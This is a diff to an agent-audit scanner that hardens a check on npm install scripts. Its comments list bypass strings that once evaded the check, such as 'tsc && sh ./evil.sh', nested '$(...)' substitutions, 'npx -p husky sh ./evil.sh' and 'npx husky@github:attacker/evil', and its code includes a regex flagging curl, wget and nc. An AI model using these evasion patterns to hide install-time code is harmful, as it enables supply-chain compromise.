@@ -17,7 +17,10 @@ from agent_audit_kit.scanners._helpers import (
 )
 from agent_audit_kit.scanners._launchers import (
     Launched,
+    _shell_split,
+    _shell_syntax,
     basename,
+    invocation,
     invocation_packages,
     launch_evidence,
     launched_packages,
@@ -33,6 +36,7 @@ from agent_audit_kit.scanners._manifest_deps import (
     _command_entries,
     declarations,
 )
+from agent_audit_kit.scanners._versions import parse_range
 
 # Known vulnerable packages: ecosystem -> name -> affected version range
 # Covers npm, Python (PyPI), and Rust (crates.io)
@@ -77,12 +81,22 @@ NETWORK_IN_SCRIPTS = re.compile(
     r"\b(curl|wget|fetch|nc|ncat|ssh|https?|axios|request)\b", re.IGNORECASE
 )
 
-# What a command of an install script may start with to pass AAK-SUPPLY-003.
-# `npx` was here too, so any package given to it passed: a launcher is judged
-# by the package it runs instead (`_launch_is_local`).
-_SAFE_SCRIPT_PREFIXES = ("tsc", "node", "npm run build", "webpack", "rollup", "esbuild", "vite")
-# The same build tools as program names, for `npx tsc`.
+# The build tools a command of an install script may run to pass AAK-SUPPLY-003,
+# by program name (`node_modules/.bin/tsc` is `tsc`). They were matched as a text
+# prefix of the command, so `tscripts/setup.sh`, `vite-installer` and, through
+# `node`, `NODE_ENV=production sh ./evil.sh` passed. `npx` was a prefix too, so
+# any package given to it passed: a launcher is judged by the package it runs
+# instead (`_launch_is_local`).
 _SAFE_SCRIPT_TOOLS = frozenset({"tsc", "node", "webpack", "rollup", "esbuild", "vite"})
+# A shell variable assignment before a command (`NODE_ENV=production webpack`).
+_ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=")
+# How deep command substitutions nested in each other are judged; one nested
+# deeper is reported unread.
+_MAX_SUBSTITUTION_DEPTH = 4
+# Words and operator runs, for a line the shell splitter gives up on.
+_FALLBACK_WORD = re.compile(r"[();<>|&]+|[^ \t\r\n();<>|&]+")
+# What ends a word for sh, so a `#` after one of these starts a comment.
+_WORD_BREAKS = frozenset(" \t\r\n;&|()<>")
 # Launchers that run a package from node_modules when it is installed and fetch
 # it only when it is not. `pnpm dlx`, `pnpx` and `yarn dlx` always fetch.
 _LOCAL_FIRST_LAUNCHERS = frozenset({"npx", "npm exec", "npm x", "bunx", "bun x"})
@@ -295,28 +309,71 @@ def _scan_package_json(project_root: Path) -> list[Finding]:
     return findings
 
 
-def _install_script_reported(script: str, declared: set[str]) -> bool:
+def _install_script_reported(script: str, declared: set[str], depth: int = 0) -> bool:
     """Does an install script run something AAK-SUPPLY-003 reports?
 
     A script that names a network word is reported, as is one too long to
-    split. Otherwise every command it runs is judged, not only the first:
-    `tsc && sh ./evil.sh` passed because it started with `tsc`. A command must
-    start with a build tool on the safe list or be a launcher running a package
-    the project installs (`_launch_is_local`). A fallback that runs nothing
-    (`|| true`, `|| echo 'skipped'`) is not judged after the first command.
+    split. Otherwise every command it runs is judged (`_command_passes`), not
+    only the first: `tsc && sh ./evil.sh` passed because it started with `tsc`.
+    A command after the first that runs nothing (`|| true`, `&& echo done`) is
+    not judged, unless it redirects into a file, but every command substitution,
+    `$(...)` or backticks, is judged wherever it sits, as a script of its own:
+    `tsc && echo "$(sh ./evil.sh)"` hid one inside the quoted argument of a
+    command that runs nothing. Inside a substitution a command that runs
+    nothing is not judged in any position (`node $(echo build.js)`); one nested
+    deeper than `_MAX_SUBSTITUTION_DEPTH` is reported unread.
     """
     if NETWORK_IN_SCRIPTS.search(script) or len(script) > _MAX_JUDGED_SCRIPT:
         return True
-    for index, (words, redirected) in enumerate(_script_commands(script)):
-        if index and not redirected and words[0] in _NO_OP_COMMANDS:
+    text, substitutions = _shell_parts(script)
+    for inner in substitutions:
+        if depth >= _MAX_SUBSTITUTION_DEPTH or _install_script_reported(inner, declared, depth + 1):
+            return True
+    for index, (words, redirected) in enumerate(_script_commands(text)):
+        program = _without_assignments(words)
+        if (index or depth) and not redirected and program and program[0] in _NO_OP_COMMANDS:
             continue
-        if starts_with_launcher(words):
-            launched = invocation_packages(words)
-            if not launched or not all(_launch_is_local(one, declared) for one in launched):
-                return True
-        elif not " ".join(words).lower().startswith(_SAFE_SCRIPT_PREFIXES):
+        if not _command_passes(program, declared):
             return True
     return False
+
+
+def _without_assignments(words: list[str]) -> list[str]:
+    """The command after any leading `NAME=value` words."""
+    i = 0
+    while i < len(words) and _ASSIGNMENT.match(words[i]):
+        i += 1
+    return words[i:]
+
+
+def _command_passes(words: list[str], declared: set[str]) -> bool:
+    """Does one command of an install script run only what AAK-SUPPLY-003 allows?
+
+    The command is read after its variable assignments, which run nothing, so a
+    command that is only assignments does not pass. It passes when its program
+    is a build tool on the safe list, by name (`node_modules/.bin/tsc` is
+    `tsc`), when it is `npm run build`, as whole words, or when it is a launcher
+    running packages the project installs (`_launch_is_local`). The safe list
+    was matched as a prefix of the command text, so `tscripts/setup.sh`,
+    `vite-installer`, `npm run build-and-setup` and, through `node`,
+    `NODE_ENV=production sh ./evil.sh` passed. When an option named the
+    launcher's package (`npx -p pkg cmd`, `npm exec --package=pkg -- cmd`), the
+    command it then runs is judged in turn, unless it is that package's own
+    (`npx -p husky husky`): `npx -p husky sh ./evil.sh` passed because only
+    husky was looked at.
+    """
+    while words and starts_with_launcher(words):
+        packages, command = invocation(words)
+        if not packages or not all(_launch_is_local(one, declared) for one in packages):
+            return False
+        if not command or basename(command[0]) in {npm_spec(one.spec).name for one in packages}:
+            return True
+        words = _without_assignments(command)
+    if not words:
+        return False
+    if basename(words[0]).lower() in _SAFE_SCRIPT_TOOLS:
+        return True
+    return basename(words[0]).lower() == "npm" and words[1:3] == ["run", "build"]
 
 
 def _launch_is_local(launched: Launched, declared: set[str]) -> bool:
@@ -327,27 +384,41 @@ def _launch_is_local(launched: Launched, declared: set[str]) -> bool:
     install` with husky declared runs the project's own husky, while `npx
     some-remote-package` fetches whatever the registry serves and runs it during
     install. `npx` used to pass whatever it was given. A build tool on the safe
-    list passes under them too (`npx tsc`), as it does alone. `pnpm dlx`, `pnpx`
-    and `yarn dlx` fetch the package even when it is installed.
+    list passes under them too (`npx tsc`), as it does alone. Only a bare name
+    or a registry version passes: `npx husky@github:attacker/evil` and `npx
+    husky@npm:evil-installer` name a declared package and fetch another, and a
+    tag (`husky@latest`) can name a release the project does not install.
+    `pnpm dlx`, `pnpx` and `yarn dlx` fetch the package even when it is
+    installed.
     """
     if launched.launcher not in _LOCAL_FIRST_LAUNCHERS or launched.ecosystem != "js":
         return False
-    name = npm_spec(launched.spec).name
-    return name in declared or name.lower() in _SAFE_SCRIPT_TOOLS
+    spec = npm_spec(launched.spec)
+    if spec.kind != "registry" or (spec.version and parse_range(spec.version, "npm") is None):
+        return False
+    return spec.name in declared or spec.name.lower() in _SAFE_SCRIPT_TOOLS
 
 
 def _script_commands(script: str) -> list[tuple[list[str], bool]]:
     """The commands a script runs, each with whether it redirects into a file.
 
     A line is split at `&&`, `||`, `;`, `|`, `&` and parentheses; a newline
-    ends a command too. A redirection and its target are dropped from the words
-    (`node build.js > build.log`), so the target is not read as a command.
+    ends a command too. A line the shell splitter gives up on (an unclosed
+    quote) is split at whitespace and those operators: it fell back to
+    whitespace alone, so the `#'` of `tsc&&sh ./evil.sh #'` left `tsc&&sh` one
+    word, though sh reads `#'` as a comment (dropped first, in `_shell_parts`). A redirection and its target are dropped from
+    the words (`node build.js > build.log`), so the target is not read as a
+    command.
     """
     commands: list[tuple[list[str], bool]] = []
+    syntax = _shell_syntax("();<>|&", " \t\r\n", "")
     for line in script.splitlines():
+        tokens = _shell_split(line, syntax)
+        if tokens is None:
+            tokens = _FALLBACK_WORD.findall(line)
         words: list[str] = []
         redirected = skip = False
-        for token in shell_tokens(line):
+        for token in tokens:
             if skip:
                 skip = False
             elif token and set(token) <= _SHELL_PUNCTUATION:
@@ -362,6 +433,99 @@ def _script_commands(script: str) -> list[tuple[list[str], bool]]:
         if words:
             commands.append((words, redirected))
     return commands
+
+
+def _shell_parts(script: str) -> tuple[str, list[str]]:
+    """A script as sh reads it: its text without comments, and the text of
+    each outermost command substitution, `$(...)` or backticks, in it.
+
+    A comment starts at a `#` that begins a word outside quotes and runs to the
+    end of its line; a `#` inside a word (`github:org/repo#sha`, `$#`) is part
+    of it. Quotes are followed across lines, as sh follows them, so a `#` on a
+    line inside a quoted string does not hide the lines after it. sh runs a
+    substitution outside single quotes, inside double quotes too, so a single
+    quote within double quotes (`"it's $(cmd)"`) does not hide one, and a `#`
+    inside one does not end the line around it. An ANSI-C string (`$'...'`),
+    whose backslash escapes a quote, is replaced by an empty string, which the
+    shell splitter reads as sh does.
+    """
+    kept: list[str] = []
+    substitutions: list[str] = []
+    quote = ""
+    word_start = True
+    i = start = 0
+    n = len(script)
+    while i < n:
+        char = script[i]
+        if quote == "'":
+            if char == "'":
+                quote = ""
+            i += 1
+            continue
+        if char == "\\":
+            i += 2
+            word_start = False
+            continue
+        if char == "`" or (char == "$" and script.startswith("(", i + 1)):
+            if char == "`":
+                end = i + 1
+                while end < n and script[end] != "`":
+                    end += 2 if script[end] == "\\" else 1
+                substitutions.append(script[i + 1:end])
+            else:
+                end = _closing_paren(script, i + 2)
+                substitutions.append(script[i + 2:end])
+            i = end + 1
+            word_start = False
+            continue
+        if quote:
+            if char == '"':
+                quote = ""
+        elif char == "$" and script.startswith("'", i + 1):
+            end = i + 2
+            while end < n and script[end] != "'":
+                end += 2 if script[end] == "\\" else 1
+            kept.append(script[start:i])
+            kept.append("''")
+            i = start = end + 1
+            word_start = False
+            continue
+        elif char in "'\"":
+            quote = char
+            word_start = False
+        elif char == "#" and word_start:
+            kept.append(script[start:i])
+            end = script.find("\n", i)
+            i = start = n if end == -1 else end
+            continue
+        else:
+            word_start = char in _WORD_BREAKS
+        i += 1
+    kept.append(script[start:])
+    return "".join(kept), substitutions
+
+
+def _closing_paren(text: str, i: int) -> int:
+    """The index of the `)` that closes a `(` just before `i`, or the end."""
+    depth, quote, n = 1, "", len(text)
+    while i < n:
+        char = text[i]
+        if char == "\\" and quote != "'":
+            i += 2
+            continue
+        if quote:
+            if char == quote:
+                quote = ""
+        elif char in "'\"":
+            quote = char
+        elif char == "(":
+            depth += 1
+        elif char == ")":
+            depth -= 1
+            if depth == 0:
+                return i
+        i += 1
+    return n
 
 
 def _declared_packages(data: dict[str, Any]) -> set[str]:
